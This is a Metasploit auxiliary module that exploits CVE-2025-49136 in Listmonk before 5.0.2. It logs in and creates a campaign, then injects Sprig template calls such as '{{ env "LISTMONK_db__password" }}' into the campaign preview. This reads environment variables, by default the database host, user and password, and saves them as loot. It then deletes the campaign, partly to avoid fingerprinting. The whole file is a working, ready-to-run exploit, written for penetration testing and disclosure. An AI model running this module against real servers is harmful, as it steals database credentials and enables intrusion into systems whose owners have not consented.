##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Listmonk Insecure Sprig Template Functions Environment Disclosure',
        'Description' => %q{
          This module exploits insecure Sprig template functions in Listmonk
          versions prior to v5.0.2. The env and expandenv functions are enabled
          by default, allowing authenticated users with campaign permissions to
          extract sensitive environment variables via campaign preview.
        },
        'Author' => ['Tarek Nakkouch'],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2025-49136'],
          ['GHSA', 'jc7g-x28f-3v3h', 'knadh/listmonk']
        ],
        'DisclosureDate' => '2025-06-08',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options([
      Opt::RPORT(9000),
      OptString.new('TARGETURI', [true, 'Base path to Listmonk', '/']),
      OptString.new('USERNAME', [true, 'Listmonk username']),
      OptString.new('PASSWORD', [true, 'Listmonk password']),
      OptString.new('ENVVAR', [false, 'Comma-separated list of environment variables to read (uses default list if not set)']),
      OptString.new('CAMPAIGN_NAME', [false, 'Campaign name (random if not set)'])
    ])
  end

  def check
    begin
      login
    rescue Msf::Exploit::Failed
      return Msf::Exploit::CheckCode::Unknown('Authentication failed')
    end

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'api', 'about')
    })

    return Msf::Exploit::CheckCode::Unknown('Connection failed') unless res

    if res.code == 200
      json = res.get_json_document
      return Msf::Exploit::CheckCode::Unknown('Failed to parse version information') unless json

      if json['version']
        version_string = json['version'].gsub(/^v/, '')
        version = Rex::Version.new(version_string)
        if version >= Rex::Version.new('4.0.0') && version < Rex::Version.new('5.0.2')
          return Msf::Exploit::CheckCode::Appears("Listmonk version #{version_string} is vulnerable")
        else
          return Msf::Exploit::CheckCode::Safe("Listmonk version #{version_string} is patched")
        end
      end
    end

    Msf::Exploit::CheckCode::Unknown('Could not determine if target is running Listmonk')
  end

  def get_nonce
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'admin', 'login')
    })

    fail_with(Failure::Unreachable, 'Connection failed') unless res

    html = res.get_html_document
    fail_with(Failure::UnexpectedReply, 'Could not parse HTML login page') unless html

    nonce = html.at('input[@name="nonce"]/@value')
    fail_with(Failure::UnexpectedReply, 'Could not extract nonce from login page') unless nonce

    nonce.text
  end

  def login
    nonce = get_nonce

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'admin', 'login'),
      'keep_cookies' => true,
      'vars_post' => {
        'nonce' => nonce,
        'next' => '/admin',
        'username' => datastore['USERNAME'],
        'password' => datastore['PASSWORD']
      }
    })

    fail_with(Failure::Unreachable, 'Connection failed during login') unless res

    if res.code == 302
      print_good('Login successful')
    else
      fail_with(Failure::NoAccess, "Login failed with code #{res.code}")
    end
  end

  def create_campaign
    # Use random campaign name to avoid collisions on re-runs and reduce fingerprinting
    campaign_name = datastore['CAMPAIGN_NAME'] || Rex::Text.rand_text_alpha(8..12)

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'api', 'campaigns'),
      'ctype' => 'application/json',
      'data' => {
        'archiveSlug' => campaign_name,
        'name' => campaign_name,
        'subject' => campaign_name,
        'lists' => [1],
        'from_email' => 'listmonk <noreply@listmonk.yoursite.com>',
        'content_type' => 'richtext',
        'messenger' => 'email',
        'type' => 'regular',
        'tags' => [],
        'send_at' => nil,
        'headers' => [],
        'media' => []
      }.to_json
    })

    fail_with(Failure::Unreachable, 'Connection failed during campaign creation') unless res

    if res.code == 200
      parsed = res.get_json_document
      fail_with(Failure::UnexpectedReply, 'Failed to parse campaign creation response') unless parsed

      campaign_id = parsed['data']['id']
      vprint_status("Campaign created with ID: #{campaign_id}")
      return campaign_id
    else
      fail_with(Failure::Unknown, "Failed to create campaign: #{res.code}")
    end
  end

  def preview_campaign(campaign_id, payload)
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'api', 'campaigns', campaign_id.to_s, 'preview'),
      'vars_post' => {
        'template_id' => '1',
        'content_type' => 'richtext',
        'body' => payload
      }
    })

    fail_with(Failure::Unreachable, 'Connection failed during preview') unless res

    fail_with(Failure::Unknown, "Preview failed with code: #{res.code}") unless res.code == 200
    extract_results(res.body)
  end

  def default_env_vars
    [
      'LISTMONK_db__host',
      'LISTMONK_db__port',
      'LISTMONK_db__user',
      'LISTMONK_db__password',
      'LISTMONK_db__database',
      'LISTMONK_app__address'
    ]
  end

  def delete_campaign(campaign_id)
    res = send_request_cgi({
      'method' => 'DELETE',
      'uri' => normalize_uri(target_uri.path, 'api', 'campaigns', campaign_id.to_s)
    })

    if res && res.code == 200
      vprint_good("Campaign #{campaign_id} deleted successfully")
    else
      print_warning("Failed to delete campaign #{campaign_id}")
    end
  end

  def extract_results(html)
    doc = Nokogiri::HTML(html)
    wrap_div = doc.at('div[@class="wrap"]')
    fail_with(Failure::UnexpectedReply, 'Could not find wrap div in response') unless wrap_div

    paragraphs = wrap_div.search('p').map(&:text).map(&:strip).reject(&:empty?)

    if paragraphs.any?
      print_good('Environment variable(s) extracted:')
      print_line('')
      paragraphs.each do |result|
        print_line(result.to_s)
      end

      loot_data = paragraphs.join("\n")
      store_loot(
        'listmonk.env',
        'text/plain',
        rhost,
        loot_data,
        'listmonk_env_disclosure.txt',
        'Listmonk Environment Variables'
      )
      print_line('')

      return paragraphs
    else
      print_error('No results found in response')
      return []
    end
  end

  def run
    print_status("Targeting #{full_uri}")

    # Determine which environment variables to extract
    if datastore['ENVVAR']
      env_vars = datastore['ENVVAR'].split(',').map(&:strip)
      print_status("Targeting specific environment variables: #{env_vars.join(', ')}")
    else
      env_vars = default_env_vars
      print_status("Using default environment variable list (#{env_vars.length} variables)")
    end

    # Build payload with all environment variables
    payload_parts = env_vars.map do |var|
      "<p>#{var}: {{ env \"#{var}\" }}</p>"
    end
    payload = payload_parts.join

    login

    begin
      campaign_id = create_campaign
      print_status('Executing template to extract environment variables...')
      preview_campaign(campaign_id, payload)
    ensure
      # Clean up by deleting the campaign even if extraction fails
      delete_campaign(campaign_id) if campaign_id
    end
  end
end
